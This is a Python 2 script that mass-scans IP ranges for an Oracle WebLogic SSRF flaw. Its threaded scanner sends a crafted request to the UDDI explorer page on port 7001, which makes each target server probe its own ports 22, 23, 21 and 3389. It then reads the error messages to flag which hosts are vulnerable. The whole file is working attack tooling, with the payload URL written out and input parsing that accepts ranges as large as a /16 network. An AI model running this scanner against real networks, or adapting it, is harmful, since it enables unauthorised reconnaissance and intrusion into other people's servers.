#!/usr/bin/env python  
# -*- coding: utf-8 -*- 

import getopt
import re
import sys
import time
import Queue
import threading
import httplib

queue = Queue.Queue()
I = 0

def scan(ip_str):
    web_ports = ('7001',)
    test_ports = ('22','23','21','3389')
    for web_port in web_ports:
        ssrf = 0
        len1 = 0
        len2 = 0
        for test_port in test_ports:
            exp_url = "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s" %(ip_str,test_port) \
                   + "&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
             
            httpClient = None
            resp = ''
            try:
                httpClient = httplib.HTTPConnection(ip_str, int(web_port), timeout=15)
                httpClient.request('GET', exp_url)
                response = httpClient.getresponse()
                print response.status
                print response.reason
                resp = response.read()
            except Exception, e:
                print e.message
            finally:
                if httpClient:
                    httpClient.close()
            re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',resp)
            re_sult2 = re.findall('but could not connect',resp)
            len1 = len(re_sult1)
            len2 = len(re_sult2)
            print str(len1) + '----' + str(len2)
            if (len1 != 0 and len2 == 0):
                ssrf = 1
                break
        print ip_str + 'rrrrrrrrr\n'
        if ssrf > 0:
            print ip_str + ':' + web_port + ' is Weblogic SSRF'
        else:
            print ip_str + ':' + web_port + ' is NOT Weblogic SSRF\n' 

class ThreadNum(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            try:
                if queue.empty():  break
                queue_task = self.queue.get()
            except:
                break
            try:
                task_host = queue_task
                scan(task_host)
            except Exception,e:
                continue
    
def t_join(m_count):
    tmp_count = 0
    i = 0
    if I < m_count:
        count = len(ip_list) + 1
    else:
        count = m_count
    while True:
        time.sleep(4)
        ac_count = threading.activeCount()
        #print ac_count,count
        if ac_count < count  and ac_count == tmp_count:
            i+=1
        else:
            i=0
        tmp_count = ac_count
        #print ac_count,queue.qsize()
        if (queue.empty() and threading.activeCount() <= 1) or i > 5:
            break

def get_ip_list(ip_info):
    ip_list = []
    iptonum = lambda x:sum([256**j*int(i) for j,i in enumerate(x.split('.')[::-1])])
    numtoip = lambda x: '.'.join([str(x/(256**i)%256) for i in range(3,-1,-1)])
    if '-' in ip_info:     # 格式举例   192.168.0.1-192.168.0.
        ip_range = ip_info.split('-')
        ip_start = long(iptonum(ip_range[0]))
        ip_end = long(iptonum(ip_range[1]))
        ip_count = ip_end - ip_start
        if ip_count >= 0 and ip_count <= 65536:
            for ip_num in range(ip_start,ip_end+1):
                ip_list.append(numtoip(ip_num))
        else:
            print '-h wrong format'
    elif '.ini' in ip_info:    #读取IP列表文件。文件以.ini结尾 。可以多行；一行内以空格分隔IP
        fp = open(ip_info,'r')
        lines = fp.readlines()
        fp.close()
        for eachline in lines:
            l_list = eachline.strip('\n').split()
            for ip in l_list:
                ip_list.extend(get_ip_list(ip))
    elif ',' in ip_info:                                   #格式举例  192.168.0.1,192.168.2.2,192.168.5
        ip_info_list = ip_info.split(',')
        for each_ip_info in ip_info_list:
            ip_list.extend(get_ip_list(each_ip_info))
    else:
        ip_split=ip_info.split('.')
        net = len(ip_split)
        if net == 2 or (net == 3 and ip_split[2] == ''):    #格式举例  192.168 或 192.168.
            for b in range(1,255):
                for c in range(1,255):
                    ip = "%s.%s.%d.%d"%(ip_split[0],ip_split[1],b,c)
                    ip_list.append(ip)
        elif net == 3 or (net == 4 and ip_split[3] == ''):   #格式举例 192.168.0 或 192.168.0.
            for c in range(1,255):
                ip = "%s.%s.%s.%d"%(ip_split[0],ip_split[1],ip_split[2],c)
                ip_list.append(ip)
        elif net == 4 :                #格式举例 192.168.0。1
            ip_list.append(ip_info)
        else:
            print "-h wrong format"
    return ip_list
    
if __name__ == "__main__":
    msg = '''
Usage: python scan-weblogic-ssrf.py -h IP [-m 10]
-h 192.168.0.1 |  -h 192.168.0.1-192.168.0.128 | -h 192.168.0.1,192.168.1.1,192.168.0 |
-h  ip_list_file.ini | -h 192.168.0 | -h 192.168.0.
'''
    ip_list = []

    if len(sys.argv) < 3:
        print msg
        sys.exit(-1)
    try:
        options,args = getopt.getopt(sys.argv[1:],"h:m")
        ip_info = ''
        m_count = 10
        for opt,arg in options:
            if opt == '-h':
                ip_info = arg
            elif opt == '-m':
                m_count = int(arg)
        ip_list = get_ip_list(ip_info)
    except Exception,e:
        print msg
    if len(ip_list) == 0 :
        print msg
        sys.exit(-1)
    for ip_str in ip_list:
        queue.put(ip_str)
    for i in range(m_count):
        t = ThreadNum(queue)
        t.setDaemon(True)
        t.start()
    t_join(m_count)







